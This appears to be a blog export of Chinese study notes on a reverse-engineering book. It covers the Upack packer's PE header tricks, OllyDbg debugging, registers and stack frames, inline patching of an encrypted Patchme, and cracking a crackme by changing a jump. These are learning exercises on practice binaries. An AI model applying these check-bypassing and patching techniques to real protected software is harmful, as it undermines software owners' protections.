SizeofoptionalHeaders\n\n\n\n\n这个其实已经解释过了，无论是header32对应的E0，还是32+对应的F0，都比148小\n这样我增大了sizeofoptionalheaders的值，就会在optional_header和section_header之间留出来了一块地方\n这样就可以像这个区域插入解码代码了\n\noptional header的起始位置是28，所以section_header的起始位置是，148+28=170 （16进制计算）\n\n但是为什么image_optional_header结束的位置是D7呢？为什么是D7后面会解释\n\n所以从image_optional_header结束的位置到170中间放着的就是解码代码。\n\n18.5.3 IMAGE_OPTIONAL_HEADER.NumberOfRvaAndSizesQ：NumberOfRvaAndSizes的值也发生了变化，为什么？\n\n目的是向文件头中插入自身代码\n这个值的作用是指定datadirectory数组的大小，正常是10，但是在Upack中改为了A\n\n\n\n所以Upack中，IMAGE_DATA_DIRECTORY数组的后6个元素会被忽略\n\n\n也就是这个表索引A后面的会被忽略\n\n\n上面蓝色的区域(D8- 107区域)，Load_config之后是Upack忽视的部分。\n\n这部分是Upack自身的解码代码\n\n\n\n18.5.4 IMAGE_SECTION_HEADER\n从NT头中可以知道节区数量是3个\n\nQ：使用Hexeditor查看IMAGE_SECTION_HEADER结构体。？\n\n&#x3D;&#x3D;为什么是170 - 1E7&#x3D;&#x3D;\n\n\n18.5.5 重叠节区Q：Upack的一个主要特征\n\n随意重叠PE节区与文件头\n\nQ：通过Stud_PE查看UPack的IMAGE_SECTION_HEADER结构体\n\n可以看到第一个节区和第三个节区在文件中的起始偏移和文件大小完全一致，说明这两个节区在文件中是重叠的。\n但是在内存中确是不一样的\n\n\nQ：看下面这个图\n\nPE装载器用相同的文件映像创造出了不同的内存映像\t\n第一（三）个节区的文件大小很小\n第二个节区的文件大小为AE28，非常大，这里存储着压缩后的原文件\n内存中的第一个节区的大小为14000，和原文件Size of Image的大小一样，也就是压缩后的第一个文件会被解压缩到第一个节区\n\n\nQ：总结\n\n压缩的notepad在内存的第二个节区解压缩的同时被记录到第一个节区\nnotepad.exe(原文件)的内存映像会被整体解压，所以程序能够正常运行(地址变得准确而一致)。\n\n18.5.6 RVA to RAW各种PE实用程序对Upack束手无策的原因就是无法正确进行RVA一&gt;RAW的变换\nQ：计算EP的RAW\n\nRVA = 1018位于第一个节区，算一下RAW &#x3D; 1018 - 1000 + 10 = 28\n\n但是28并不是EP代码区\n\n\n一般来说指向节区开始的PointerToRawData的值应该是FileAlignment的整数倍，Upack的FileAlignment是200，所以PointerToRawData的值应该是0、200、400、600\n\nPE装载器发现第一个节区的PointerToRawData是10，会强制转换为整数倍，在现在也就是0。\n\n因此，实际位置应该是1018 - 1000 + 0 &#x3D; 18\n\n\n\n18.5.7 导入表Q：查看IMAGE_IMPORT_DESCRIPTOR结构体。\n\n首先从datadirectory数组中获得IDT（IMAGE_IMPORT_DESCRIPTOR）\n\n\n前面四个字节000271EE为导入表的地址(RVA)，后面四个字节00000014是导入表的大小\n\n\nQ：进行RVA-&gt;RAW的变换\n\n271EE - 27000 + 0 = 1EE 注意这里是加0 ，不是加10\n用hex editor查看位置\n\n\n\n\n根据PE规范，导入表是一系列IMAGE_IMPORT_DESCRIPTOR数组，每有一个导入的库，就有一个结构体\n所以上面偏移的1EE~201为第一个结构体，但是后面不是第二个结构体，也不是导入表结束的Null结构体\n\nQ：为什么呢？\n\n因为在文件中，第三节区到200就结束了，所以后面的不会映射到第三节区\n\n\n第三节区加载到内存时，只映射01FF到27000271FF，剩下的全部填充为null\n\n\n\nQ: 综上\n\n虽然Upack文件并没有真正的以Null表示IMAGE_IMPORT_DESCRIPTOR的结束，但是200之后的内容并不会映射到第三个节区，相当于以null结束了\n\n18.5.8 导入地址表Q：把上面的结构体映射一下\n\n\nName的RVA值为2，属于Header区域，第一个节区从1000开始，Header区域的RVA和RAW一样\n\n在偏移为2的区域，看到了字符串KERNEL32.DLL\n\n\n正常情况下，这个区啥也没干，属于DOS头部分，属于不使用的部分，UPack把导入的DLL名称写到了这\n\n\n\nQ：跟踪INT或者IAT\n\n由于INT为0，那就跟踪一下IAT，只要能找到函数名称就行，计算RAW\n11E8 - 1000 + 0 = 1E8 \n\n这里有两个API名称，分别是RVA 28和BE，结束是null\n\n\n28处对应的函数\n\n\n\n\nBE处对应的函数\n\n\n\n0x19 Upack调试 - 查找OEP19.1 Ollydbg运行错误Q：由于Upack把NumberOfRvaAndSizes的值设置为A，在用Ollydbg打开时，程序会停留在ntdll.dll处，无法正常调试\n\n因此需要找到EP的位置，让程序从Ep处开始运行\n\n通过Study_PE找到Ep的位置\n\n\n在Ollydbg中定位到01001018，New origin here会创建一个新的起始点，程序从这开始执行\n\n\n此时就可以正常调试了\n\n\n19.2 解码循环\n所有的压缩器中都存在解码循环\n\nUpack把压缩后的代码放到第二个节区，再运行解码循环把解压缩后的放到第一个节区\nMOV ESI,10011B0\nLODS DWORD PTR DS:[ESI]  \n\n&#x2F;&#x2F;&quot;LODS&quot; 指令是 &quot;Load String&quot; 的缩写，用于加载字符串或数据块\nDWORD PTR&quot; 用于指定操作数的大小，这里表示操作数是一个双字（32位）\n&quot;DS:[ESI]&quot; 是一个内存引用，表示从段寄存器 DS 所指向的段中，以 ESI 寄存器中的值作为偏移地址来访问内存\n\n这两条指令的意思是从10011B0中加载4字节的数据，保存到EAX中\n\n\n\n\n\n汇编指令,它会重复执行复制字符串，直到ECX计数器为0\nREP MOVS BYTE PTR ES:[EDI],BYTE PTR DS:[ESI]\n\nREP&quot; 是一个前缀指令，用于指示指令重复执行。\n&quot;MOVS&quot; 是 &quot;Move String&quot; 的缩写，用于将字符串或数据块从一个内存位置复制到另一个内存位置。\n&quot;BYTE PTR&quot; 是一个操作数大小指示符，表示每次传送的是一个字节（8位）数据。\n&quot;ES:[EDI]&quot; 是目标地址，表示要将数据复制到 ES:EDI 指向的内存位置。\n&quot;DS:[ESI]&quot; 是源地址，表示要从 DS:ESI 指向的内存位置读取数据。\n\n汇编指令:会把累加器中的数据存储到EDI中\nSTOS BYTE PTR ES:[EDI]\n\n&quot;STOS&quot; 是 &quot;Store String&quot; 的缩写，用于将字符串或数据块存储到内存中。\n&quot;BYTE PTR&quot; 是一个操作数大小指示符，表示要存储的是一个字节（8位）数据。\n&quot;ES:[EDI]&quot; 是目标地址，表示要将数据存储到 ES:EDI 指向的内存位置\n\n&#x3D;&#x3D;问题：为什么已经有了MOVS，还需要LODS和STOPS呢&#x3D;&#x3D;\n19.3 设置IAT\n压缩器执行完解码循环后，就会根据原文件重新组织IAT\n\n0x20 内嵌补丁练习对加密文件、运行时解压缩文件“打补丁”时，经常使用 内嵌补丁 (Inline Patch)\n20.1 内嵌补丁“内嵌补丁”是“内嵌代码补丁(Inline Code Patch)的简称。\nQ：难以直接修改指定代码时，插“洞穴代码”(CodeCave)的补丁代码后，对程序打补丁。\n\n常用于对象程序经过运行时压缩(或加密处理)而难以直接修改的情况。\n\n\n如果直接在原来的加密代码上打补丁，在运行解码过程时，可能会解出完全不同的结果\n\nEP代码先将加密的OEP代码解密，再跳转到OEP处\n\n\n现在EP代码解密后，修改JMP指令，让它跳转到洞穴代码处。\n\n也就是每次运行时，都需要对进程的代码打补丁，这种方式是内嵌代码补丁法\n\n\n\n\n20.2 Patchme\n\n需要修改字符串\n\n20.3 调试： 查看代码流\nOllydbg打开后，可以看到加密代码\n\n\n继续调试，可以看到三个解密循环\n\n\n第一个解密循环：会从4010F5 ~  4010F5+154 -1 = 401248 进行解密\n\n\n\nXOR BYTE PTR DS:[EBX],44\n也就是把DS:[EBX]位置的数据和44异或\n&quot;XOR&quot; 是异或操作的指令。\n&quot;BYTE PTR&quot; 是一个操作数大小指示符，表示要操作的是一个字节（8位）数据。\n&quot;DS:[EBX]&quot; 是指定的内存位置，表示要对 DS:EBX 指向的内存位置中的字节数据进行操作。\n&quot;44&quot; 是一个立即数，表示要与内存位置中的字节数据进行异或运算的值。\n\n\n第二个解密循环：会从401007~401085区域进行解密\n\n\n\n第三个解密循环：还是会从4010F5 ~  4010F5+154 -1 = 401248 进行解密，也就是说该区域加密2次\n\n\n接着进入401039处，下面是计算校验和，取4010F5 ~  401248处的数据计算校验和，也就是把所有的数据都加起来，加到EDX中。\n\n循环结束时，EDX存储的就是校验和值，用这个值判断是否修改了双重加密区域\n\n\n\n&#x3D;&#x3D;这里我觉得是猜出来的&#x3D;&#x3D;\n\n不\n\n\n\n\n汇编指令：\nXCHG DL, BH\n\n&quot;XCHG&quot; 是 &quot;Exchange&quot; 的缩写，它用于交换两个操作数的值。在这种情况下，指令将 DL 寄存器和 BH 寄存器的值进行交换。\n\n具体执行的步骤如下：\n\n将 DL 寄存器的值存储到临时存储区。\n将 BH 寄存器的值复制到 DL 寄存器中。\n最后，将之前存储在临时存储区的值复制到 BH 寄存器中。\n这条指令可以用于在汇编语言中交换两个寄存器的值，以实现数据的重新排列或交换。\n\n20.4 代码结构\n\n\n[EPCode]只是用来调用[Decoding Code]的，实际的解密处理是由[Decoding Code]完成的。\n按照[B]-[AJ-[B]的顺序解码(XOR)，运行解密后的[A]区代码。\n在[A]区代码中会求得B]区的校验和，并据此判断[B]区代码是否发生过更改。\n然后对C区解码(XOR)最后跳到EP处(40121E)\n\nQ：总结\n\n整个的流程是对所有部分进行解密，然后对B区用校验和验证\n最后会跳转到OEP\n\n20.5 内嵌补丁练习\n可以看到要修改的字符串都在B区\n但是B区加密了，所以需要通过内嵌补丁。\n\nQ：具体操作\n\n首先向文件合适位置插入用于修改字符串的代码，然后在图20-11的[A]区域将JMP OEP命令修改为JMP补丁代码(当然修改时要充分考虑文件中的[A]区域处于加密状态)。\n若运行程序时到[A]区中的JMP补丁代码语句，(此时所有代码均处于解密状态且通过校验和验证)。\n就在补丁代码中更改字符串，通过JMP命令跳转到OEP处，这样整个内嵌补丁过程就完成了。\n\n20.5.1 补丁代码的位置Q：有3种设置位置的方法\n\n方法1：设置到文件的空白区域。\n方法2：扩展最后节区后设置\n方法3：添加新节区后设置。\n\n补丁代码较少时，使用方法1，其他情况使用方法2或3。\nQ：首先尝试方法1：设置到文件的空白区域\n\n使用PEView查看示例文件的第一个节区(.text)头.\n\n\n\n\n它的virtual size是280，但是因为要以Section Alignment扩展，所以最小是1000，看下一个节区的起始位置也能看出来，是2000\n\n那么我们就可以用空白区域(null-padding)\n\n\n使用Hex Editor打开，发现都是null\n\n\n\n\n\n\n\n\n\n提示\n\n\n.text节区中1E4的属性值中添加的IMAGE SCN MEM WRITE(可写属性)。\n\n为了在程序中进行解密处理，一定要在节区头添加可写属性，获得相应内存的可写权限(当对无写权限的内存进行“写”操作时，会引发非法访问异常 )。\n\n对于一个普通的 PE文件，其代码节是无写权限的，但是包含上面示例在内的压缩工具、Crypter 等文件的代码节都有可写权限，请各位以后分析文件时注意这一点\n\n\n\n\n20.5.2 制作补丁代码&#x3D;&#x3D;这里有问题&#x3D;&#x3D;\n后面的目前我没看太懂\n总结\n学完这部分，感觉自己调试的能力非常欠缺，逐行看代码的耐心和能力还没有\n感觉这部分涉及的基础知识非常多，应该经常回看。\n\n","slug":"re-engineer-core-principle-02","date":"2023-10-22T08:39:11.000Z","categories_index":"","tags_index":"re","author_index":"XyM4ster"},{"id":"e67072c96c2129e60add5b77588d8afa","title":"re-engineer-core-principle-01","content":"引言看《逆向工程核心原理》这本书\n\n好久之前看了这本书的一部分，现在决定重新学一下。\n感觉逆向十分重要，且我的hxd wd-2711 (https://wd-2711.tech/) ，一直在学逆向，在他的感染下，我也开始学。\n\n0x01 关于逆向工程\n静态分析法：并不执行代码，观察代码文件的外部特征\n\n0x02 逆向分析HelloWorld2.2 调试Helloworld.exe\n首先用ollydbg打开helloworld.exe\n\n\n\n2.2.3 入口点\n\n这里是当前程序停止的地方，就是入口点\n\n2.2.4 跟踪函数OllyDbg的基本指令\n\n\n这里是visual C++的启动函数\n这里就是跟着书上一步一步调试，直到找到main函数\n\n\n2.3 熟悉调试器2.3.1 调试器指令\n\n\n2.3.2 设置大本营其实也就相当于设置断点\nGoto 命令\n\nctrl + G设置地址为40104F\n执行F4就会让程序运行到该处\n\n设置断点\n\nF2设置断点\n\nOllydbu菜单栏中，选择View-Breakpoints选项，快捷键alt+B，打开Breakpoints对话框\n\n\n注释\n\n按键盘上的 ;  可以添加注释\n鼠标右键，可以选择search for-User defined comment\n\n\n标签(label)\n\n按键盘上的 ：  可以添加标签\n标签也可以按照上面的方法检索\n\n2.4 快速查找指定的代码方法1：代码执行法\n\n就是从头到尾执行代码，那可以根据程序运行的结果来判断是否找到了指定的代码\n\n方法2：字符串检索法\nVC++中默认字符串使用Unicode码表示，并且处理字符串中的API函数也都变更为Unicode系列函数。\n\n\n鼠标右键-Search for- All referenced text string，可以看到所有代码中引用的字符串\n\n\n\n这里可以直接定位hello world的位置\n\n\n\n接着在数据窗口，用goto 定位4092a0，\n找到helloworld。\n\n\n这里的4092A0和上面代码区域的401xxx不一样，HelloWorld.exe进程中，409XXX地址空间被用来保存程序使用的数据。\n方法3：API检索法(1）\n鼠标右键-Search for-All intermodular calls\nOllydbg也可以摘录出程序调用的API函数列表\n\n我们可以根据程序的功能来大致判断他用的是哪些API,像上面这个弹出窗口的功能，大致是调用了user32.MessageBoxW()API\n\n方法4：API检索法(2)\n鼠标右键-Search for-Name in all calls\nOllydbg也不能列出所有的API函数列表，如果使用压缩器&#x2F;保护器对文件压缩后，Ollydbg就无法提取了。\n\n这就需要向dll代码库中添加断点。\nAPI是操作系统对用户提供的函数，实现在C:\\Windows\\systems32文件夹中的*.dll文件。\n也就是我们编写的应用程序执行某种操作时，必须用os提供的API向os发送请求，此时与API对应的系统DLL文件就会被加载到应用程序的进程内存中。\nalt + M打开内存映射窗口，这里可以看到HelloWorld的进程内存，底部的是User32库\n\n\n打开name in all moudles，这是.dll文件中提供的所有api，找到messageboxw export&#x2F;\n\n\n在40100e处调用了messageBoxW，执行完毕会返回到401014地址\n2.5 使用打补丁修改helloworld字符串2.5.2修改字符串的两种方法方法1：直接修改字符串缓冲区\n\n因为helloworld字符串是放在409a20这个地址处的，那我就直接在dump窗口执行Go to命令，进入字符串缓冲区，按ctrl + E打开编辑窗口\nunicode编码中用两个字节表示一个罗马字母，Unicode字符串必须以null结束，占据2个字节(添加null时不能直接在unicode文本框中进行，要在Hex中添加)\n\n\n\n此时按F9继续执行程序，发现输出已经变了\n\n\n\n\n但是目前的更改只是在当前调试中的更改，如果想永久更改，需要选中字符串，右键copy to executable file，在弹窗的窗口中，右键选择save file\n\n\n方法2：在其他内存区域新建字符串并传递给消息函数\n\n\n\n\n\n\n提示\n应用程序被加载到内存时有一个最小的内存分配大小，一般为1000。 即使程序运行时只占用100 内存，它被加载到内存时仍然会分到1000 左右的内存，这些内存一部 分被程序占用，其余部分为空余区域，全部被填充为NULL。\n\n\n\n根据helloworld的地址是4092a0，向下滑动，发现有Null区域\n在这部分新增字符串‘\n在代码区，按空格修改push的地址\n运行程序，成功更改\n\n\n问题：但是把上面修改完的保存为可执行文件，却并不能正常运行\n\nQ：什么是启动函数\n\n0x03 小端序3.1 字节序大端序：采用大端序存储数据时，内存地址低位存储数据的高位，内存地址高位存储数据的低位\n小端序：地址高位存储数据的高位，地址低位存储数据的低位，这是一种逆序存储方式，保存的字节顺序被倒。Inter X86CPU采用小端序\n\n最后一行字母e的ASCII码是0x65，字符串最后以null结尾。\n本书之后默认所有数据都采用小端序存储\n0x04 IA32寄存器寄存器(Register)是CPU内部用来存放数据的一些小型存储区域，它与我们常说的RAM(Random AccessMemory，随机存储器、内存)略有不同。\nCPU访问(Access)RAM中的数据时要经过较长的物理路径，所以花费的时间要长一些。\n而寄存器集成在CPU内部，拥有非常高的读写速度。\n4.2 IA-32寄存器IA-32是inter推出的32位元架构。\n基本程序运行寄存器\n通用寄存器(General Purpose Registers，32位，8个)\n段寄存器(SegmentRegisters，16位，6个)\n程序状态与控制寄存器(Program Status and Control Registers，32位，1个)\n指令指针寄存器(Instruction Pointer，32位，1个)\n\n通用寄存器通用寄存器是一种通用型的寄存器，用于传送和暂存数据，也可参与算术逻辑运算，并保存运算结果。\nIA-32中每个通用寄存器的大小都是32位，即4个字节。\n\n\n\n\n\n\n\n提示\n在寄存器名称缩略语之前添加字母E(Extended，扩展)，表示该寄存器在 16位 CPU (IA-16) 时就已经存在，并且其大小在 IA-32 下由原 16位扩展为32 位。\n为了实现对低16位的兼容，各寄存器又可以分为高(H: High)、低(L: Low)几个独立寄存器\n\nEAX：32位\nAX：EAX的低16位\nAH：AX的高8位\nAL：AX的低8位\n\n若想全部使用4个字节(32位)，则使用 EAX;若只想使用2个字节(16位)，只要使用EAX的低16位部分AX就可以了。AX又分为高8位的AH与低8位的AL两个独立的寄存器。\n\n\n\n\nEAX：(针对操作数和结果数据的)累加器\nEBX：(DS段中的数据指针)基址寄存器\nECX：(字符串和循环操作的)计数器\nEDX：(IO指针)数据寄存器\n\n以上4个寄存器主要用在算术运算(ADD、SUB、XOR、OR等)指中，常常用来保存常量与变量的值。\n某些汇编指令(MUL、DIV、LODS等)直接用来操作特定寄存器，执行这些命令后，仅改变特定寄存器中的值。此外，ECX与EAX也可以用于特殊用途。\n\n循环命令 (LOOP) 中，ECX用来循环计数 (loop count)，每执行一次循环，ECX都会减1。\nEAX一般用在函数返回值中，所有Win 32 API函数都会先把返回值保存到EAX再返回。\n\n\n\n\n\n\n\n提示\n编写Windows汇编程序时，Win32 ApI函数内部会使用ECX与EDX，所以当这两个寄存器中有值时，应该先保存一下。\n\n\n通用寄存器中的其他几个寄存器名称：\n\nEBP：(SS段中栈内数据指针)扩展基址指针寄存器\nESI：(字符串操作源指针) 源变址寄存器口\nEDI：(字符串操作目标指针)目的变址寄存器\nESP：(SS段中栈指针)栈指针寄存器\n\n以上4个寄存器主要用作保存内存地址的指针。\n\nESP指示栈区域的栈顶地址，某些指令(PUSH、POP、CALL、RET)可以直接用来操作。ESP(栈区域管理是程序中相当重要的部分，请不要把ESP用作其他用途)。\nEBP表示栈区域的基地址，函数被调用时保存ESP的值，函数返回时再把值返回ESP，保证栈不会崩溃。\nESI和EDI与特定指令(LODS、STOS、REP、MOVS等)一起使用，主要用于大存复制。\n\n段寄存器IA-32的保护模式中，段是一种内存保护技术，它把内存划分为多个区段，并为每个区段赋予起始地址、范围、访问权限等，以保护内存。此外，它还同分页技术(Paging)一起用于将虚拟内存变更为实际物理内存。段内存记录在SDT(Segment Descriptor Table，段描述符表)中，而段寄存器就持有这些SDT的索引 (index)。\n下图描述了保护模式下的内存分段模型。段寄存器总共由6种寄存器组成，分别为CS、SS、DS、ES、FS、GS，每个寄存器的大小为16位，即2个字节。另外，每个段寄存器指向的段描述符(Segment Descriptor)与虚拟内存结合，形成一个线性地址(Linear Address)借助分页技术，线性地址最终被转换为实际的物理地址(PhysicalAddress)。\n\nCS：Code Segment，代码段寄存器\nSS：Stack Segment,栈段寄存器\nDS：Data Segment，数据段寄存器\nES：Extra ( Data)Segment，附加(数据)段寄存器\nFS：Data Segment，数据段寄存器\nGS：Data Segment，数据段寄存器\n\n顾名思义，CS寄存器用于存放应用程序码所在段的段基址，SS寄存器用于存放栈段的段基址，DS寄存器用于存放数据段的段基址。ES、FS、GS寄存器用来存放程序使用的附加数据段的段基址，如图4-3所示。\n\n程序调试中会经常用到FS寄存器，它用于计算SEH(Structured Exception Handler，结构化异常处理机制)，TEB(Thread Environment Block，线程环境块)，PEB (Process Environment Block进程环境块)等地址。\n程序状态与控制寄存器\nEFLAGS：Flag Register 标志寄存器\n\nIA-32中标志寄存器的名称为EFLAGS，其大小为4个字节 ( 32位，由原来的16位FLAGS寄存器扩展而来。）如图4-4所示，EFLAGS寄存器的每位都有意义，每位的值或为1或为0，代表On&#x2F;Off或True&#x2F;False。其中有些位由系统直接设定，有些位则根据程序命令的执行结果设置。如上所述，EFLAGS寄存器共有32个位元，掌握每位的含义是相当困难的。学习代码逆向分析技术的初级阶段，只要掌握3个与程序调试相关的标志即可，分别为\n\nZF ( Zero Flag，零标志)：若运算结果为0,其值为1。否则为0.\nOF(Overflow Flag，溢出标志)：有符号整数 (signedinteger)溢出时，OF值被置为1。此外，MSB(Most Significant Bit.最高有效位)改变时，其值也被设为1。\nCF(Carry Flag，进位标志)：无符号整数(unsignedinteger)溢出时，其值也被置为1。\n\n\n\n\n\n\n\n提示\n以上3个标志之所以重要，是因为在某些汇编指令，特别是 Jcc(条件跳转) 指令中要检查这3个标志的值，并根据它们的值决定是否执行某个动作。\n\n\n\n指令指针寄存器\nEIP: Instruction Pointer，指令指针寄存器\n\n\n指令指针寄存器保存着CPU要执行的指令地址，其大小为32位 (4个字节，由原16位IP寄存器扩展而来。\n程序运行时，CPU会读取EIP中一条指令的地址，传送指令到指令缓冲区后，EIP寄存器的值自动增加，增加的大小即是读取指令的字节大小。\n这样，CPU每次执行完一条指令，就会通过EIP寄存器读取并执行下一条指令。\n与通用寄存器不同，我们不能直接修改EIP的值，只能通过其他指令间接修改，这些特定指令包括JMP、Jcc、CALL、RET。此外，我们还可以通过中断或异常来修改EIP的值。\n\n0x05 栈\n栈内存在进程中的作用如下:\n​\t(1)暂时保存函数内的局部变量\n​\t(2)调用函数时传递参数。\n​\t(3)保存函数返回后的地址\n执行push指令后，ESP由16ff78变成了19ff74,把100压入栈，执行Pop后，又恢复为原来的状态。\n\n\n\n0x06 分析abex’ crackme#1可以看到整个代码中就有call MessageboxBoxA，是因为他是用汇编语言编写的可执行文件，反编译之后直接变为反汇编代码。\n而使用VC++等开发工具写的代码，会有一部分启动函数是由编译器添加的，这在反编译之后就会非常复杂。\n汇编指令\n6.2 破解\n\n把这个命令直接改成JMP 40103D，直接跳转\n\n\n6.3 将参数压入栈函数调用时的顺序与参数压入栈的顺序相反。\n\n这是因为在取参数时候，最顶上的会被取出来，那么第一个取出来的就是NULL，刚好和参数的顺序一样。\n0x07 栈帧7.1 栈帧\n栈帧就是利用EBP(栈指针，请注意不是ESP)寄存器访问栈内局部变量、参数函数返回地址等的手段。\nESP寄存器承担着栈顶指针的作用，而EBP寄存器则负责行使栈帧指针的职能。\n程序运行中，ESP寄存器的值随时变化，访问栈中函数的局部变量、参数时，若以ESP值为基准编写程序会十分困难，并且也很难使CPU引用到准确的地址。\n所以，调用某函数时，先要把用作基准点(函数起始地址的ESP值保存到EBP.并维持在函数内部。这样，无论ESP的值如何变化，以EBP的值为基准(base)能够安全访问到\n\n7.2 调试Stackframe.exe7.2.1 StackFrame.cpp\n7.2.2 开始执行main函数&amp;生成栈帧main函数的起始地址，ESP的值是19FF30，401250保存在ESP中，也就是栈中，是main函数的返回地址。\n\n执行Push EBP，保存EBP的值。\n\n把ESP的值赋值给EBP,因为此时ESP是栈底指针，后续esp的值要一直改变，可以用ebp的值访问局部变量。\n\n右键，address,relative to ebp，此时可以看到Esp和EBP相同， 都是19ff2c，此处存着是最开始(push ebp)的值，19ff74，401250是之前就push到栈里的函数返回地址。\n\n7.2.3 设置局部变量long a = 1, b=2;\n首先，esp-8是开辟了8字节的空间，因为long数据每个都是4字节。\n\n接着是两条赋值语句，这个DWORD是个类型转换，SS是Stack Segment的缩写，表示栈段。\n\n\n\n执行完之后，1和2就被添加到栈里。\n\n7.2.4 add()函数参数传递与调用add(a,b)\n首先会把调用add所需要的参数压入栈中，先放b再放a，接着调用add函数。这里看出之前把1,2压入栈中是为了通过ebp获取局部变量，赋值给函数调用的参数。\n\n\n返回地址\n执行call命令进入被调用的函数之前，CPU会先把函数的返回地址压入栈中，用作函数执行完之后的返回地址。\n也就是会把，call的下一条指令的地址401041放到栈中。\n\n\n7.2.5 开始执行add()函数&amp;生成栈帧long add(long a,long b)&#123; &#125;\n函数开始执行时，栈中会单独生成与其对应的栈帧。\n正如前面执行main函数时，会保存main函数栈帧的ebp的地址一样，这里也会先保存ebp的值。\n\n然后把esp的值给ebp。\n\n\n7.2.6 设置add()函数的局部变量(x,y)long x = a, y = b\n这四条语句是开启8字节的空间给x,y，再从栈里取出原来存储的a b，把值赋给x y。\n&#x3D;&#x3D;这里发现函数内部的变量也是掀开偶空间，然后从上向下赋值，和栈增长的方法是相反的&#x3D;&#x3D;\n\n\n7.2.7 ADD运算return (x + y)\n首先把ebp-8也就是x&#x3D;1的值给EAX，然后让EAX和EBP-4(也就是x&#x3D;2)的值相加，最后把结果3赋值给EAX，并返回。\n\n\n7.2.8 删除函数add()的栈帧&amp;函数执行完毕对于这条命令，它会把ebp的值给esp，执行完之后，执行完上面的命令后，地址401003处的 SUB ESP8命令就会失效，即函数add的2个局部变量x、y不再有效。\n\n\n执行pop ebp，之前把ebp的值放入栈中，现在把它Pop出来，让ebp恢复为之前的值19ff2c。\n\n\nRETN\n执行return语句，函数返回到调用的下一条地址\n\n7.2.9 从栈中删除函数add()的参数(整理栈)这里执行esp+8，因为add函数的参数  a  b不再需要了，所以就把他们去掉，此时栈内的情况如下。\n\n\n\n\n\n\n\n\n提示\n被调函数执行完毕后，函数的调用者(Caller)负责清理存储在栈中的参数，这种方式称为 cdecl方式;反之，被调用者(Callee)负责清理保存在栈中的参数，这种方式称为stdcall方式。这些函数调用规则统称为调用约定(Calling Convention)，这在程序开发与分析中是一个非常重要的概念，第 10章将进一步讲解相关内容。\n\n\n7.2.10 调用printf()函数printf(&quot;%d\\n&quot;,add(a,b))这也是个函数，之前计算的结果存储在EAX中，所以先把EAX放到栈内，再把%d放入栈内，执行add函数。\n\n\nadd ESP 8\n执行结束后，去掉刚才添加的两个参数，黑色表示ESP的位置\n\n7.2.11 设置返回值return 0\nXOR命令用来进行Exclusive OR bit(异或)运算，其特点为“2个相同的值进行XOR运算，结果为0”。XOR命令比MOV EAX 0命令执行速度快，常用于寄存器的初始化操作。\n\n\n\n\n\n\n提示\n相同的值连续执行两次变回原值，这个特征被用于编码和解码。\n\n\n\n7.2.12 删除栈帧&amp;main函数终止和前面一样，就是把EBP的值给ESP，相当于直接扔掉当前函数(main函数)内定义的局部变量，如下图的红色箭头所示。\n接着pop ebp，让ebp回到原来的值\n\n\n最后执行return ，整个流程结束。\n7.3 设置Ollydbg选项7.3.1 Disasm选项alt + O,选择Disasm\n分在Debugging options对话框中选择Disasm选项卡后，分别点击“Show default segments“Always show size ofmemory operands”左侧的复选框，取消选择。观察代码窗口可以发现，原来代码中显示的默认段与内存大小都不再显示了。\n7.3.2 Analysis 1选项选择Analysis1选项卡，点击“SHOWAPGsand LOCALsin procedures”左侧的复选框，启用该选项。局部变量、参数分别表示成了LOCAL.1、ARG.1的形显示。\nollyDbg会直接分析函数为栈帧，然后把局部变量的个数、参数的个数等显示在代码窗口。\n\n总结Q1：ESP和EBP指针\n\nESP就是栈顶指针，会根据Push pop命令，进行相应的移动\nEBP指针很重要，用来管理局部变量，参数，返回地址等。\n\nQ2：整个程序执行过程中栈的变化\n\n\n首先执行main函数，push main函数的返回地址\npush ebp，并把esp的值给ebp\n开辟8字节的空间，先Push a &#x3D; 1，再push b&#x3D;2\n执行add函数\n为add函数开辟8字节的空间，先push b，再push a\npush函数的返回地址，也就是下一条指令的地址\npush ebp，把esp的值给ebp\n接着再开辟8字节的空间，此时也是先push b 再push a\n利用ebp 取出x y 的值，计算x + y的结果，给EAX寄存器\n\n\n删除add函数的栈帧，也就是让add函数内定义的变量失效\n把ebp的值赋给esp\npop ebp，让ebp恢复成可以访问main函数的地址\n\n\n删除add的参数a,b，因为不再用了\n执行printf函数\n先push EAX中的值，再压%d\n执行函数\n\n\n用XOR EAX EAX计算返回值 return 0\n删除main函数的栈帧\n把ebp的值给esp\npop ebp\n\n\n程序结束\n\n0x08 abex’ crackme #2要调试的abex‘s crackme #2文件由Visual Basic编写而成\n8.2 Visual Basic文件的特征8.2.1 VB专用引擎VB文件使用名为MSVBVM60.dll(Microsoft Visual Basic Virtual Machine60)的VB专用引擎(也称为The Thunder Runtime Engine)。举个使用VB引擎的例子，显示消息框时，VB代码中要调用MsgBox()函数。\n\n其实，VB编辑器真正调用的是MSVBVM60.dll里的rtcMsgBox()函数\n在该函数内部通过调用user32dIl里的MessageBoxW()函数( Win32 API)来工作\n也可以在VB代码中直接调用user32.dll里的MessageBoxW()。\n\n8.2.2 本地代码和伪代码根据使用的编译选项的不同，VB文件可以编译为本地代码(N code)与伪代码(Pcode)。\n\n本地代码一般使用易于调试器解析的IA-32指令\n而伪代码是一种解释器(Interpreter)语言，它使用由VB引擎实现虚拟机并可自解析的指令(字节码)。\n因此，若想准确解析VB的伪代码，就需要分析VB引擎并实现模拟器。\n\n\n\n\n\n\n\n提示\n伪代码具有与Java(Java虚拟机)、Python (Python专用引擎)类似的形态结构。使用伪代码的好处是非常方便代码移植(编写&#x2F;发布针对特定平台的引擎，用户代码借助它几乎可以不加任何修改地在指定平台上运行)。\n\n\n8.2.3 事件处理程序VB主要用来编写GUI程序，IDE用户界面本身也最适合于GUI编程。由于VB程序采用Windows操作系统的事件驱动方式工作，所以在main()或WinMain()中并不存在用户代码(希望调试的代码)，用户代码存在于各个事件处理程序(event handler)之中。\n就上述abex’crackme#2而言，用户代码在点击Check按钮时触发的事件处理程序内\n8.2.4 未文档化的结构体VB中使用的各种信息(Dialog、Control、Form、Module Function等)以结构体形式保存在文件内部。由于微软未正式公开这种结构体信息，所以调试VB文件会难一些。\n8.3 开始调试\nEP的地址为401238。\n\n401238地址处的PUSH 401E14命令用来把RT_MainStruct结构体的地址(401E14)压人栈。\n然后40123D地址处的CALL 00401232命令调用401232地址处的JMP DWORDPTR DS:[4010A0]指令。\n该JMP指令会跳转至VB引擎的主函数ThunRTMain()(前面压人栈的401E14的值作为ThunRTMain0的参数)。\n\n\n\n8.3.1 间接调用40123D地址处的CALL 